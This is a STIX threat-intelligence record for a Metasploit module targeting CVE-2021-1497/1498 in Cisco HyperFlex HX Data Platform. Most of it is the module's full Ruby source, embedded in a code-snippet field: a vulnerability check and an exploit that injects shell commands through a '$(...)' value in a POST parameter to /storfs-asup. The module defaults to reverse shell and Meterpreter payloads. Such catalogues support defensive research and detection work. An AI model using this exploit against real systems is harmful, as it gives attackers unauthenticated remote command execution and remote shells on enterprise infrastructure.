{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f97ced9-3cf1-4205-bd36-eacde2edfefa",
    "created": "2024-08-14T17:03:57.493334Z",
    "modified": "2024-08-14T17:03:57.493338Z",
    "name": "Cisco HyperFlex HX Data Platform Command Execution",
    "description": " This module exploits an unauthenticated command injection in Cisco HyperFlex HX Data Platform's /storfs-asup endpoint to execute shell commands as the Tomcat user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec.rb",
            "external_id": "cisco_hyperflex_hx_data_platform_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/4f532147-b27b-4079-aed1-5cfdc402cf5c"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/ptswarm/status/1390300625129201664"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco HyperFlex HX Data Platform Command Execution',\n        'Description' => %q{\n          This module exploits an unauthenticated command injection in Cisco\n          HyperFlex HX Data Platform's /storfs-asup endpoint to execute shell\n          commands as the Tomcat user.\n        },\n        'Author' => [\n          'Nikita Abramov', # Discovery\n          'Mikhail Klyuchnikov', # Discovery\n          'wvu' # Analysis and exploit\n        ],\n        'References' => [\n          ['CVE', '2021-1497'], # HyperFlex HX Data Platform Installer\n          ['CVE', '2021-1498'], # HyperFlex HX Data Platform\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR'],\n          ['URL', 'https://attackerkb.com/assessments/4f532147-b27b-4079-aed1-5cfdc402cf5c'],\n          ['URL', 'https://twitter.com/ptswarm/status/1390300625129201664']\n        ],\n        'DisclosureDate' => '2021-05-05',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false, # Privesc left as an exercise for the reader\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n\n    register_advanced_options([\n      OptFloat.new('CmdExecTimeout', [true, 'Command execution timeout', 3.5])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => %w[GET POST].sample,\n      'uri' => normalize_uri(target_uri.path, 'storfs-asup')\n    )\n\n    return CheckCode::Unknown unless res\n\n    unless res.code == 200 &&\n           res.body.include?('Action for the servlet need be specified.')\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears('Storfs ASUP servlet detected.')\n  end\n\n  def exploit\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(cmd)\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'storfs-asup'),\n      'vars_post' => {\n        'action' => Faker::Hacker.verb,\n        %w[token mode].sample => \"$(#{cmd})\"\n      }\n    }, datastore['CmdExecTimeout'])\n\n    return unless res\n\n    fail_with(Failure::PayloadFailed, cmd) unless res.code == 200\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-05-05",
    "x_mitre_platforms": [
        "linux'"
    ]
}